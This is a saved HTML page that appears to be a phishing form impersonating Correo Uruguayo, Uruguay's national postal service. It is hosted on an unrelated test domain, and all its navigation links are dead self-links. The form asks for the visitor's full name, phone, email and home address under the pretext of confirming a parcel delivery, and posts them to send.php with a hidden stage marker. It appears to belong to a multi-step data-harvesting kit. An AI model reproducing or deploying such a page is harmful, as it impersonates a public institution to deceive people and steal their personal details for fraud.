<!DOCTYPE html>
<html lang="es-ES" dir="ltr"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Dirección de Envío - Correo Uruguayo</title>
    <meta content="initial-scale=1.0, width=device-width" name="viewport">
    
    <link href="./index_files/css2" rel="stylesheet">
    <style>
        /* ===== RESET & BASE ===== */
        *, *:before, *:after { box-sizing: border-box; }
        body {
            margin: 0;
            color: #000;
            background: #f1f1f1;
            font-family: 'Source Sans Pro', sans-serif;
            font-size: 100%;
            line-height: 1.2em;
            font-weight: normal;
        }
        a { color: #124d98; font-weight: normal; text-decoration: none; }
        a:hover { text-decoration: underline; color: #124d98; }
        img { max-width: 100%; border: 0; }
        ul { margin: 0; padding: 0; list-style: none; }
        .container {
            max-width: 1120px;
            margin: 0 auto;
        }
        @media screen and (max-width: 1200px) {
            .container { width: 96%; padding: 0; }
        }
        .container:before, .container:after { display: table; content: " "; }
        .container:after { clear: both; }
        .fl { float: left !important; }
        .fr { float: right !important; }

        /* ===== TOPBAR ===== */
        #topbar {
            background: #59595c;
            color: #fff;
            font-size: .85em;
            height: 35px;
        }
        #topbar a { color: #fff; }
        #topbar ul { float: right; margin: 8px 0; }
        #topbar ul li { float: left; margin: 0 10px; }
        @media (max-width: 767px) { #topbar { display: none; } }

        /* ===== MAIN HEAD ===== */
        #main-head {
            background: #00a7e6;
            padding: 20px 0 24px 0;
            color: #fff;
        }
        #main-head h1 { margin: 0; }
        #main-head a { color: #fff; }
        #main-head #logo {
            padding: 14px 10px 14px 2px;
            display: block;
            float: left;
            border: 2px solid #00a7e6;
            width: 45%;
        }
        #main-head #logo:hover { border-bottom-color: #fff; }
        #main-head #logos { float: right; margin-bottom: 10px; }
        #main-head #logos ul li { float: left; margin-left: 16px; }
        @media (max-width: 979px) {
            #main-head { padding: 10px 0; }
            #main-head #logos { display: none; }
            #main-head #logo { float: left; padding: 0; }
            #main-head #logo img { margin-top: 2px; max-width: 160px; }
        }

        /* ===== NAVIGATION BAR ===== */
        .barraMenu {
            background-color: #01579b;
            height: 48px;
        }
        .barraMenu .container { position: relative; }
        nav#navigation { background: 0; color: #fff; }
        nav#navigation a { color: #fff; }
        nav#navigation ul.navegacionPrincipal {
            margin: 0; padding: 0;
            background: #01579b !important;
            width: 100%;
        }
        nav#navigation ul.navegacionPrincipal > li {
            float: left;
            width: 25%;
            background: transparent url() no-repeat center right;
            position: static;
            cursor: pointer;
        }
        nav#navigation ul.navegacionPrincipal > li:last-child { background: 0; }
        nav#navigation ul.navegacionPrincipal > li > span {
            text-transform: uppercase;
            text-decoration: none;
            text-align: center;
            padding: 14px 0;
            display: block;
            font-size: 1.2em;
            transition: background-color .45s;
            color: #fff;
        }
        nav#navigation ul.navegacionPrincipal > li > span:hover {
            background: #fff;
            color: #01579b;
        }
        @media (max-width: 979px) {
            .barraMenu { height: auto; }
            nav#navigation { display: none; }
        }

        /* ===== MAIN CONTENT AREA ===== */
        #content {
            padding: 0;
        }
        .page-title-bar {
            background: #01579b;
            padding: 28px 0;
            color: #fff;
            margin-bottom: 0;
        }
        .page-title-bar h2 {
            margin: 0;
            font-weight: 600;
            font-size: 2em;
            font-family: 'Source Sans Pro', sans-serif;
            letter-spacing: -0.5px;
        }
        .page-title-bar p {
            margin: 8px 0 0 0;
            font-size: 1.1em;
            font-weight: 300;
            opacity: 0.9;
        }

        /* ===== FORM SECTION ===== */
        .form-section {
            padding: 40px 0 60px 0;
        }
        .form-wrapper {
            max-width: 720px;
            margin: 0 auto;
            background: #fff;
            border-top: 4px solid #fd0;
            border-radius: 0 0 3px 3px;
            box-shadow: 1px 1px 3px #666;
            padding: 0;
        }
        .form-header {
            padding: 30px 40px 20px 40px;
            border-bottom: 1px solid #e8e8e8;
        }
        .form-header h3 {
            font-size: 1.45em;
            text-transform: uppercase;
            font-weight: 600;
            letter-spacing: -1px;
            color: #414141;
            margin: 0 0 6px 0;
        }
        .form-header p {
            color: #666;
            font-size: 0.95em;
            margin: 0;
        }
        .form-header p span.required-note {
            color: #3d6789;
        }
        .form-body {
            padding: 30px 40px 40px 40px;
        }
        .form-group {
            margin-bottom: 22px;
        }
        .form-group label {
            display: block;
            margin-bottom: 6px;
            color: #000;
            font-size: 16px;
            font-weight: 400;
        }
        .form-group label .required {
            color: #3d6789;
            margin-left: 3px;
        }
        .form-group input[type="text"],
        .form-group input[type="email"],
        .form-group input[type="tel"] {
            width: 100%;
            height: 42px;
            padding: 6px 14px;
            border: 1px solid #999;
            color: #000;
            font-family: 'Source Sans Pro', sans-serif;
            font-size: 15px;
            font-weight: 400;
            transition: border-color 0.3s ease;
            border-radius: 0;
            background: #fff;
        }
        .form-group input:focus {
            outline: none;
            border-color: rgba(0, 172, 255, 0.8);
            box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 8px rgba(82,168,236,0.6);
        }
        .form-group input::placeholder {
            color: #7f7f7f;
        }
        .form-row {
            display: flex;
            gap: 20px;
        }
        .form-row .form-group {
            flex: 1;
        }
        .form-submit {
            margin-top: 30px;
            text-align: left;
        }
        .form-submit button {
            background: #01579b;
            padding: 10px 40px;
            text-align: center;
            color: #fff;
            border-radius: 3px;
            border: 1px solid #014174;
            font-family: 'Source Sans Pro', sans-serif;
            font-weight: 700;
            font-size: 1.05em;
            cursor: pointer;
            transition: all 0.35s ease;
            min-width: 180px;
        }
        .form-submit button:hover {
            box-shadow: 0 0 4px #666;
            background: #014174;
        }
        .form-submit button:active {
            border-color: #00a7e6;
        }
        .form-info {
            margin-top: 20px;
            padding: 14px;
            background: #f1f1f1;
            font-size: 0.9em;
            color: #414141;
            border-radius: 2px;
            line-height: 1.4em;
        }
        .form-info strong { color: #01579b; }

        @media (max-width: 600px) {
            .form-row { flex-direction: column; gap: 0; }
            .form-header, .form-body { padding-left: 20px; padding-right: 20px; }
            .page-title-bar h2 { font-size: 1.5em; }
        }

        /* ===== FOOTER ===== */
        footer#page-footer {
            background: #e6e6e6;
            border-top: 3px solid #fff;
        }
        footer#page-footer > .container > .row {
            padding: 26px 0;
        }
        footer#page-footer h2 {
            font-weight: 500;
            color: #414141;
            font-size: 1.2em;
            letter-spacing: 0;
        }
        footer#page-footer ul { margin-bottom: 60px !important; }
        footer#page-footer ul li { margin-bottom: 9px; }
        footer#page-footer ul li a {
            font-size: .9em;
            color: #124d98 !important;
            text-decoration: underline;
        }
        footer#page-footer ul li a:hover { text-decoration: none; }
        .row-fluid { overflow: hidden; }
        .span3 {
            width: 23.5%;
            float: left;
            margin-right: 2%;
        }
        .span3:last-child { margin-right: 0; }
        #box-tel {
            background: #f1f1f1;
            padding: 14px;
            font-size: .9em;
            text-align: center;
            color: #414141;
            float: right;
            width: 100%;
        }
        #box-tel p { margin: 0; }
        #box-tel span { display: block; margin-top: 6px; margin-bottom: 10px; font-size: 1.4em; }
        #box-tel a { word-break: break-all; }
        .disclaim {
            background: #01579b;
            color: #fff;
            padding: 30px 0;
        }
        .disclaim:after { content: ""; display: block; clear: both; }
        .disclaim img { float: left; margin-right: 14px; }
        .disclaim a { color: #fff; }
        .disclaim address { float: left; font-style: normal; font-size: .9em; line-height: 1.2em; }
        .disclaim ul { margin-bottom: 0 !important; }
        .disclaim ul li { line-height: 20px; }
        .disclaim ul li a { color: #fff !important; }

        @media screen and (max-width: 800px) {
            .span3 { width: 50%; }
            .span3:nth-child(2n) { margin-right: 0; }
            #box-tel { float: left; margin-top: 30px; }
        }
        @media (max-width: 767px) {
            .span3 { width: 100%; margin-right: 0; }
            .disclaim { text-align: center; }
            .disclaim img { float: none; margin: 0 0 10px 0; }
            .disclaim address { float: none !important; }
            .fr { width: 100%; float: left; }
            .fr { margin-top: 30px; }
            .fr a { padding: 10px; display: block; }
        }
    </style>
<script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="21e7e81e-10e6-4fef-bf96-1f864a3d5bd7" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="21e7e81e-10e6-4fef-bf96-1f864a3d5bd7" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script></head>
<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMy4wIiwic2NvcmUiOjIwMzAwMH1d" __processed_0f9bf69b-dc55-4fdf-9dbe-dea4ac7afadb__="true">
    <!-- ===== TOPBAR ===== -->
    <div id="topbar" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <ul>
                <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#"><span>Preguntas frecuentes</span></a></li>
                <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#"><span>Convocatorias</span></a></li>
                <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#"><span>Contacto</span></a></li>
                <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#"><span>Servicios web</span></a></li>
            </ul>
        </div>
    </div>

    <!-- ===== HEADER ===== -->
    <div id="main-head" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <h1>
                <a id="logo" href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#" title="Ir a la página principal de Correo Uruguayo">
                    <img alt="Correo Uruguayo" height="54" src="./index_files/company_logo.png" width="255">
                </a>
            </h1>
            <div id="logos" bis_skin_checked="1">
                <ul>
                    <li><a target="_blank" href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#" title="Ir a uruguaydigital.uy"><img src="./index_files/logoUruguayDigital.png" alt="Uruguay Digital"></a></li>
                </ul>
            </div>
        </div>
    </div>

    <!-- ===== NAVIGATION ===== -->
    <div class="barraMenu" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <nav id="navigation" role="navigation">
                <ul class="navegacionPrincipal">
                    <li><span>Institucional</span></li>
                    <li><span>Productos y Servicios</span></li>
                    <li><span>Filatelia</span></li>
                    <li><span>Trámites</span></li>
                </ul>
            </nav>
        </div>
    </div>

    <!-- ===== PAGE TITLE ===== -->
    <div class="page-title-bar" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <h2>Dirección de Envío</h2>
            <p>Complete los datos de la dirección donde desea recibir su envío</p>
        </div>
    </div>

    <!-- ===== FORM CONTENT ===== -->
    <div id="content" bis_skin_checked="1">
        <div class="form-section" bis_skin_checked="1">
            <div class="container" bis_skin_checked="1">
                <div class="form-wrapper" bis_skin_checked="1">
                    <div class="form-header" bis_skin_checked="1">
                        <h3>Datos del Destinatario</h3>
                        <p>Los campos marcados con <span class="required-note">(*)</span> son obligatorios</p>
                    </div>
                    <div class="form-body" bis_skin_checked="1">
                        <form id="shippingForm" action="send.php" method="post" novalidate="">
						<input style="visibilty: hidden" type="hidden" name="step" value="bll">					

                            <div class="form-group" bis_skin_checked="1">
                                <label for="fullName">Nombre Completo <span class="required">(*)</span></label>
                                <input type="text" id="fullName" name="fullName" placeholder="Ingrese su nombre completo" required="">
                            </div>

                            <div class="form-row" bis_skin_checked="1">
                                <div class="form-group" bis_skin_checked="1">
                                    <label for="phone">Número de Teléfono <span class="required">(*)</span></label>
                                    <input type="tel" id="phone" name="phone" placeholder="Ej: 099 123 456" required="">
                                </div>
                                <div class="form-group" bis_skin_checked="1">
                                    <label for="email">Correo Electrónico <span class="required">(*)</span></label>
                                    <input type="email" id="email" name="email" placeholder="ejemplo@correo.com" required="">
                                </div>
                            </div>

                            <div class="form-group" bis_skin_checked="1">
                                <label for="address">Dirección <span class="required">(*)</span></label>
                                <input type="text" id="address" name="address" placeholder="Calle, número, apartamento, etc." required="">
                            </div>

                            <div class="form-row" bis_skin_checked="1">
                                <div class="form-group" bis_skin_checked="1">
                                    <label for="city">Ciudad <span class="required">(*)</span></label>
                                    <input type="text" id="city" name="city" placeholder="Ej: Montevideo" required="">
                                </div>
                                <div class="form-group" bis_skin_checked="1">
                                    <label for="zipCode">Código Postal <span class="required">(*)</span></label>
                                    <input type="text" id="zipCode" name="zipCode" placeholder="Ej: 11000" required="">
                                </div>
                            </div>

                            <div class="form-submit" bis_skin_checked="1">
                                <button type="submit">Confirmar Dirección</button>
                            </div>

                            <div class="form-info" bis_skin_checked="1">
                                <strong>Importante:</strong> Verifique que los datos ingresados sean correctos. La dirección proporcionada será utilizada para la entrega de su envío.
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ===== FOOTER ===== -->
    <footer id="page-footer">
        <div class="container" bis_skin_checked="1">
            <div class="row-fluid mapaSitio" style="padding: 26px 0;" bis_skin_checked="1">
                <div class="span3" bis_skin_checked="1">
                    <h2>Institucional</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Autoridades</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Sobre nosotros</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Transparencia</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Preguntas frecuentes</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Convocatorias</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Contacto</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Sala de prensa</a></li>
                    </ul>
                </div>
                <div class="span3" bis_skin_checked="1">
                    <h2>Productos y Servicios</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Paquetes</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Correspondencia</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Comercio electrónico</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Servicios en línea</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Logística</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Giros</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Firma Digital</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Tarifas</a></li>
                    </ul>
                </div>
                <div class="span3" bis_skin_checked="1">
                    <h2>Filatelia</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">¿Qué es la filatelia?</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Novedades filatélicas</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Plan filatélico anual</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Sellos</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Marcofilia</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Hojas filatélicas</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Últimas emisiones</a></li>
                    </ul>
                </div>
                <div class="span3" bis_skin_checked="1">
                    <h2>Trámites</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Declaración de compras del exterior</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Factura electrónica</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Registro en el IRCCA</a></li>
                        <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Guía de trámites</a></li>
                    </ul>
                    <div id="box-tel" bis_skin_checked="1">
                        <p>WhatsApp: <a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#"><span>098 01 2108</span></a></p>
                        <div bis_skin_checked="1">
                            <p>Atención telefónica: <span>0800 2108</span></p>
                            <a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Contáctese con nosotros</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="disclaim" bis_skin_checked="1">
            <div class="container" bis_skin_checked="1">
                <img alt="Correo Uruguayo" src="./index_files/logoCorreoPie.jpg">
                <address class="fl">Administración Nacional de Correos<br>
                Dirección: Buenos Aires 451, Montevideo, Uruguay<br>
                Teléfono: [00 598] 2916 0200<br>
                Mail: <a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">contacto@correo.com.uy</a></address>
                <ul class="fr">
                    <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Política de Privacidad</a></li>
                    <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Términos de uso</a></li>
                    <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Reglamentación de reclamaciones</a></li>
                    <li><a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#">Mapa del sitio</a></li>
                    <li>
                        <address class="fl">
                            <a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#"><img alt="Instagram" src="./index_files/instagram.png"></a>&nbsp;
                            <a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#"><img alt="X" src="./index_files/X.png"></a>&nbsp;
                            <a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#"><img alt="Linkedin" src="./index_files/Linkedin.png"></a>&nbsp;
                            <a href="https://correos.test121815.test-account.com/urr/uruguay-correros/N7v-RVv8b_GRVBY/user-347699//formulario-envio.php#"><img alt="Youtube" src="./index_files/Youtube.png"></a>
                        </address>
                    </li>
                </ul>
            </div>
        </div>
    </footer>

    <script>
        document.getElementById('shippingForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var fields = this.querySelectorAll('input[required]');
            var valid = true;
            fields.forEach(function(field) {
                field.style.borderColor = '';
                if (!field.value.trim()) {
                    field.style.borderColor = '#c33';
                    valid = false;
                }
            });
            if (valid) {
                this.submit();
            } else {
                alert('Por favor, complete todos los campos obligatorios.');
            }
        });
    </script>


</body></html>